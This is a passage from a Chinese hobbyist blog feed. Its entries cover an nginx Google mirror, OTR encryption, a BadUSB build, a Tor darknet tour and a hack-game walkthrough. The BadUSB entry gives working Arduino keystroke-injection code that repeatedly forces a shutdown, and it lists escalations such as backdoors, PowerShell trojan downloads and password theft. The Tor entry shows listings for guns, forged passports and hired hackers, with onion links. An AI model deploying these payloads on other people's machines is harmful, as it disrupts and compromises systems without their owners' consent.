<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md" target="_blank" rel="external">https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。&lt;/p&gt;
&lt;p&gt;上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。&lt;/p&gt;
    
    </summary>
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/categories/Raspberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Google镜像站的搭建</title>
    <link href="http://blog.yfgeek.com/2016/12/11/Google%E9%95%9C%E5%83%8F%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://blog.yfgeek.com/2016/12/11/Google镜像站的搭建/</id>
    <published>2016-12-11T19:21:59.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。</p>
<a id="more"></a>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Centos 6 </p>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ol>
<li>nginx</li>
<li>pcre 正则</li>
<li>ngx_http_proxy_module 反向代理</li>
<li>ngx_http_substitutions_filter_module 多重替换</li>
</ol>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 安装 gcc &amp; git</span></div><div class="line"><span class="comment">#</span></div><div class="line">apt-get install build-essential git gcc g++ make</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版源码</span></div><div class="line"><span class="comment"># nginx 官网: </span></div><div class="line"><span class="comment"># http://nginx.org/en/download.html</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"http://nginx.org/download/nginx-1.7.8.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 pcre</span></div><div class="line"><span class="comment"># pcre 官网:</span></div><div class="line"><span class="comment"># http://www.pcre.org/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 openssl</span></div><div class="line"><span class="comment"># opessl 官网:</span></div><div class="line"><span class="comment"># https://www.openssl.org/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"https://www.openssl.org/source/openssl-1.0.1j.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 zlib</span></div><div class="line"><span class="comment"># zlib 官网:</span></div><div class="line"><span class="comment"># http://www.zlib.net/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"http://zlib.net/zlib-1.2.8.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载本扩展</span></div><div class="line"><span class="comment">#</span></div><div class="line">git <span class="built_in">clone</span> https://github.com/cuber/ngx_http_google_filter_module</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载 substitutions 扩展</span></div><div class="line"><span class="comment">#</span></div><div class="line">git <span class="built_in">clone</span> https://github.com/yaoweibin/ngx_http_substitutions_filter_module</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 解压缩</span></div><div class="line"><span class="comment">#</span></div><div class="line">tar xzvf nginx-1.7.8.tar.gz</div><div class="line">tar xzvf pcre-8.38.tar.gz</div><div class="line">tar xzvf openssl-1.0.1j.tar.gz</div><div class="line">tar xzvf zlib-1.2.8.tar.gz</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 进入 nginx 源码目录</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="built_in">cd</span> nginx-1.7.8</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 设置编译选项</span></div><div class="line"><span class="comment">#</span></div><div class="line">./configure \</div><div class="line">  --prefix=/opt/nginx-1.7.8 \</div><div class="line">  --with-pcre=../pcre-8.38 \</div><div class="line">  --with-openssl=../openssl-1.0.1j \</div><div class="line">  --with-zlib=../zlib-1.2.8 \</div><div class="line">  --with-http_ssl_module \</div><div class="line">  --add-module=../ngx_http_google_filter_module \</div><div class="line">  --add-module=../ngx_http_substitutions_filter_module</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 编译, 安装</span></div><div class="line"><span class="comment"># 如果扩展有报错, 请发 issue 到</span></div><div class="line"><span class="comment"># https://github.com/cuber/ngx_http_google_filter_module/issues</span></div><div class="line"><span class="comment">#</span></div><div class="line">make</div><div class="line">sudo make install</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 启动, 安装过程到此结束</span></div><div class="line"><span class="comment">#</span></div><div class="line">sudo /opt/nginx-1.7.8/sbin/nginx</div><div class="line"></div><div class="line">vi /opt/nginx-1.7.8/conf/nginx.conf</div></pre></td></tr></table></figure>
<p>http配置方式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  server_name &lt;你的域名&gt;;</div><div class="line">  listen <span class="number">80</span>;</div><div class="line"></div><div class="line">  resolver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>;</div><div class="line">  location / &#123;</div><div class="line">    google on;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>https配置方式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  server_name &lt;你的域名&gt;;</div><div class="line">  listen <span class="number">443</span>;</div><div class="line"></div><div class="line">  ssl on;</div><div class="line">  ssl_certificate &lt;你的证书&gt;;</div><div class="line">  ssl_certificate_key &lt;你的私钥&gt;;</div><div class="line"></div><div class="line">  resolver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>;</div><div class="line">  location / &#123;</div><div class="line">    google on;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>随后<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 配置修改后, 需要 reload nginx 来让配置生效, </span></div><div class="line"><span class="comment">#</span></div><div class="line">sudo /opt/nginx-1.7.8/sbin/nginx <span class="_">-s</span> reload</div></pre></td></tr></table></figure></p>
<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。</p>
<h1 id="参考技术"><a href="#参考技术" class="headerlink" title="参考技术"></a>参考技术</h1><p><a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="external">https://github.com/cuber/ngx_http_google_filter_module</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。&lt;/p&gt;
    
    </summary>
    
      <category term="Ops" scheme="http://blog.yfgeek.com/categories/Ops/"/>
    
    
      <category term="Ops" scheme="http://blog.yfgeek.com/tags/Ops/"/>
    
  </entry>
  
  <entry>
    <title>OTR(Off-the-Record) 技术探讨</title>
    <link href="http://blog.yfgeek.com/2016/12/06/OTR%E6%8A%80%E6%9C%AF%E6%8E%A2%E8%AE%A8/"/>
    <id>http://blog.yfgeek.com/2016/12/06/OTR技术探讨/</id>
    <published>2016-12-06T20:25:59.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。</p>
<a id="more"></a>
<p>通过OTR技术，能够实现:</p>
<ul>
<li>加密聊天内容</li>
<li>证明与你聊天的人就是与你聊天的人（防止中间人攻击）</li>
<li>服务器无法记录你的真实聊天内容</li>
</ul>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="消息鉴别码-MAC"><a href="#消息鉴别码-MAC" class="headerlink" title="消息鉴别码(MAC)"></a>消息鉴别码(MAC)</h2><p>在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。</p>
<p><img src="/content/images/otr/1.png" alt=""></p>
<p>假设有两个聊天用户，一个叫Alice，一个叫Bob。</p>
<p><img src="/content/images/otr/2.jpg" alt=""></p>
<p>例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。</p>
<p>其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。</p>
<p>它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。</p>
<ul>
<li>Alice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g</li>
<li>A-&gt;B: Alice 生成g^x，并且签名SignAlice(g^x)</li>
<li>B-&gt;A: Bob 生成g^y，并且签名SignBob(g^y)</li>
<li>SS=g^xy: 生成共享的公钥</li>
</ul>
<p>第二步，使用公钥加密消息，消息传递。</p>
<ul>
<li>计算EK=Hash(SS), MK=Hash(EK) </li>
<li>A-&gt;B: Encek(M), MAC(Encek(M),MK)</li>
<li>Enc采用对称加密算法，比如AES算法用EK作为密钥</li>
<li>Bob 用MK验证MAC, 用EK解密M</li>
<li>保密性和真实性得到了保证</li>
</ul>
<p>第三步，更新密钥</p>
<ul>
<li>Alice and Bob 再取一个x’,y’</li>
<li>A-&gt;B: g^x’, MAC(g^x’, MK)</li>
<li>B-&gt;A: g^y’, MAC(g^y’, MK)</li>
<li>SS’ = H(g^x’y’)</li>
<li>EK’ = H(SS’), MK’=H(EK’)</li>
<li>随后，Alice和Bob安全清除掉之前的SS, x, y, EK</li>
</ul>
<p>第四步，继续保留 MK</p>
<ul>
<li>Alice 和 Bob 并不需要去清除MK</li>
<li>事实上，在他们发下一条消息的时候还用着之前的MK</li>
<li>这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响</li>
</ul>
<p>从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为：</p>
<ol>
<li>Alice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方</li>
<li>若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1</li>
<li>M1经由服务器被发送给消息接收方</li>
<li>Bob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M</li>
</ol>
<h1 id="Awesome-OTRs"><a href="#Awesome-OTRs" class="headerlink" title="Awesome OTRs"></a>Awesome OTRs</h1><p>官网: <a href="https://otr.cypherpunks.ca/" target="_blank" rel="external">https://otr.cypherpunks.ca/</a></p>
<p>pidgin-otr: <a href="https://otr.cypherpunks.ca/gentoo-install/otr-setup.html" target="_blank" rel="external">https://otr.cypherpunks.ca/gentoo-install/otr-setup.html</a></p>
<p>JavaScript 实现: <a href="https://github.com/arlolra/otr" target="_blank" rel="external">https://github.com/arlolra/otr</a></p>
<p>otr.to源代码(JS): <a href="https://github.com/OTRMan/otr.to-chat" target="_blank" rel="external">https://github.com/OTRMan/otr.to-chat</a></p>
<p>一个python的otr项目: <a href="https://github.com/SpiralP/HexChat-otr" target="_blank" rel="external">https://github.com/SpiralP/HexChat-otr</a></p>
<p>otrtalk(JS): <a href="https://github.com/mnaamani/otrtalk" target="_blank" rel="external">https://github.com/mnaamani/otrtalk</a></p>
<p>Facebook的OTR实现Chrome插件:<a href="https://github.com/osnr/otron" target="_blank" rel="external">https://github.com/osnr/otron</a></p>
<p>一个基于OTR技术的P2P聊天系统: <a href="https://github.com/mehrvarz/P2pChatOTR" target="_blank" rel="external">https://github.com/mehrvarz/P2pChatOTR</a></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>Arduino Leonardo 打造 Bad USB</title>
    <link href="http://blog.yfgeek.com/2016/11/27/badusb/"/>
    <id>http://blog.yfgeek.com/2016/11/27/badusb/</id>
    <published>2016-11-27T02:48:23.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>嘿嘿嘿，又是一篇猥琐小文。</p>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>什么是Bad USB？</p>
<p><img src="/content/images/badusb/0.jpg" alt=""></p>
<p>BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。</p>
<p>简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。</p>
<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。</p>
<p><img src="/content/images/badusb/1.jpg" alt=""></p>
<h1 id="原料"><a href="#原料" class="headerlink" title="原料"></a>原料</h1><ol>
<li>Arduino Leonardo</li>
<li>普通安卓USB线</li>
</ol>
<h1 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h1><p>比如我们要实现一个插入优盘就让对方电脑关机的功能：</p>
<p>用Arduino开发者工具，选择</p>
<p><img src="/content/images/badusb/2.jpg" alt=""></p>
<p>Arduino Leonardo</p>
<p>然后把程序烧录进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></div><div class="line">   Keyboard.begin();<span class="comment">//开始键盘通讯 </span></div><div class="line">  delay(<span class="number">5000</span>);<span class="comment">//延时</span></div><div class="line">  Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(<span class="string">'r'</span>);<span class="comment">//r键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.release(KEY_LEFT_GUI);</div><div class="line">  Keyboard.release(<span class="string">'r'</span>);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.println(<span class="string">"CMD"</span>);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  delay(<span class="number">3000</span>); </div><div class="line">  Keyboard.println(<span class="string">"shutdown -s -t 10"</span>);</div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.end();<span class="comment">//结束键盘通讯 </span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></div><div class="line">&#123;</div><div class="line">   Keyboard.begin();<span class="comment">//开始键盘通讯 </span></div><div class="line">  delay(<span class="number">5000</span>);<span class="comment">//延时</span></div><div class="line">  Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(<span class="string">'r'</span>);<span class="comment">//r键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.release(KEY_LEFT_GUI);</div><div class="line">  Keyboard.release(<span class="string">'r'</span>);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.println(<span class="string">"CMD"</span>);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  delay(<span class="number">3000</span>); </div><div class="line">  Keyboard.println(<span class="string">"shutdown -s -t 10"</span>);</div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.end();<span class="comment">//结束键盘通讯 </span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>已经在多台Windows电脑上试验成功。</p>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/content/images/badusb/preview.gif" alt=""></p>
<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><p>当然，你可以实现很多功能</p>
<ul>
<li>删除系统关键注册表使之蓝屏</li>
<li>留后门</li>
<li>新建用户</li>
<li>用户提权</li>
<li>调用Powershell下载木马</li>
<li>调用Powershell下载木马及从内存中提取出当前用户的Windows密码</li>
<li>rm -rf *</li>
</ul>
<p>此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。</p>
<p><a href="https://github.com/Xyntax/BadUSB-code" target="_blank" rel="external">https://github.com/Xyntax/BadUSB-code</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices" target="_blank" rel="external">http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices</a><br><a href="http://www.freebuf.com/sectool/107242.html" target="_blank" rel="external">http://www.freebuf.com/sectool/107242.html</a><br><a href="http://www.freebuf.com/articles/terminal/53886.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/53886.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;嘿嘿嘿，又是一篇猥琐小文。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>TOR暗网的秘密</title>
    <link href="http://blog.yfgeek.com/2016/11/26/TOR%E6%9A%97%E7%BD%91%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <id>http://blog.yfgeek.com/2016/11/26/TOR暗网的秘密/</id>
    <published>2016-11-26T01:00:34.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。</p>
<p>以下内容纯属虚构。</p>
<a id="more"></a>
<h1 id="另一个互联网世界"><a href="#另一个互联网世界" class="headerlink" title="另一个互联网世界"></a>另一个互联网世界</h1><p>Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。</p>
<p>Tor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。</p>
<p>下面 我们来逛一逛都有什么 奇葩的 py交易。</p>
<h3 id="虚拟主机交易"><a href="#虚拟主机交易" class="headerlink" title="虚拟主机交易"></a>虚拟主机交易</h3><p><img src="/content/images/torworld/1.png" alt=""></p>
<h3 id="免费盗版市场"><a href="#免费盗版市场" class="headerlink" title="免费盗版市场"></a>免费盗版市场</h3><p>盗版书</p>
<p><img src="/content/images/torworld/2.png" alt=""></p>
<p>盗版音乐</p>
<p><img src="/content/images/torworld/13.png" alt=""></p>
<h3 id="英国枪支弹药交易"><a href="#英国枪支弹药交易" class="headerlink" title="英国枪支弹药交易"></a>英国枪支弹药交易</h3><p><img src="/content/images/torworld/3.png" alt=""></p>
<p>比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。</p>
<p>（英国持枪是合法的，但是我不感兴趣）</p>
<h3 id="暗网iPhone交易"><a href="#暗网iPhone交易" class="headerlink" title="暗网iPhone交易"></a>暗网iPhone交易</h3><p>不知道iPhone的货源，很便宜。</p>
<p><img src="/content/images/torworld/4.png" alt=""></p>
<h3 id="办证类"><a href="#办证类" class="headerlink" title="办证类"></a>办证类</h3><p>美国护照</p>
<p><img src="/content/images/torworld/5.png" alt=""></p>
<p>美国假身份证</p>
<p><img src="/content/images/torworld/7.png" alt=""></p>
<p>英国护照</p>
<p><img src="/content/images/torworld/6.png" alt=""></p>
<p>我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。</p>
<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p><img src="/content/images/torworld/8.png" alt=""></p>
<p>此外还有很多，没什么意思</p>
<h3 id="电子邮箱"><a href="#电子邮箱" class="headerlink" title="电子邮箱"></a>电子邮箱</h3><p><img src="/content/images/torworld/9.png" alt=""></p>
<p>几乎是全匿名的电子邮箱，用比特message登录的</p>
<h3 id="政治"><a href="#政治" class="headerlink" title="政治"></a>政治</h3><p>各种资本主义反动派论坛</p>
<p><img src="/content/images/torworld/10.png" alt=""></p>
<p><img src="/content/images/torworld/11.png" alt=""></p>
<h3 id="雇佣黑阔"><a href="#雇佣黑阔" class="headerlink" title="雇佣黑阔"></a>雇佣黑阔</h3><p><img src="/content/images/torworld/12.png" alt=""></p>
<p>日一个网站500欧元，还是挺赚的。</p>
<h3 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h3><p>当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。</p>
<h2 id="导航站"><a href="#导航站" class="headerlink" title="导航站"></a>导航站</h2><p><a href="http://dirnxxdraygbifgc.onion/" target="_blank" rel="external">http://dirnxxdraygbifgc.onion/</a></p>
<p><a href="http://torlinkbgs6aabns.onion/" target="_blank" rel="external">http://torlinkbgs6aabns.onion/</a></p>
<p><a href="http://32rfckwuorlf4dlv.onion/" target="_blank" rel="external">http://32rfckwuorlf4dlv.onion/</a></p>
<p><a href="http://torwikignoueupfm.onion/" target="_blank" rel="external">http://torwikignoueupfm.onion/</a></p>
<p><a href="http://torlinkbgs6aabns.onion/" target="_blank" rel="external">http://torlinkbgs6aabns.onion/</a></p>
<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><p><a href="http://xmh57jrzrnw6insl.onion/" target="_blank" rel="external">http://xmh57jrzrnw6insl.onion/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。&lt;/p&gt;
&lt;p&gt;以下内容纯属虚构。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>再玩Monyer的Hack Game</title>
    <link href="http://blog.yfgeek.com/2016/11/23/%E5%86%8D%E7%8E%A9Monyer%E7%9A%84Hack-Game/"/>
    <id>http://blog.yfgeek.com/2016/11/23/再玩Monyer的Hack-Game/</id>
    <published>2016-11-23T19:15:20.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。</p>
<a id="more"></a>
<h1 id="第零关"><a href="#第零关" class="headerlink" title="第零关"></a>第零关</h1><p><a href="http://monyer.com/game/game1/" target="_blank" rel="external">http://monyer.com/game/game1/</a></p>
<blockquote>
<p>请点击链接进入第1关： 连接在左边→ ←连接在右边</p>
</blockquote>
<p>可是我们看不到链接地址，直接打开审查工具。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>连接在左边→<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"first.php"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>←连接在右边<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div></pre></td></tr></table></figure>
<p>好的输入地址，我么进入第一关</p>
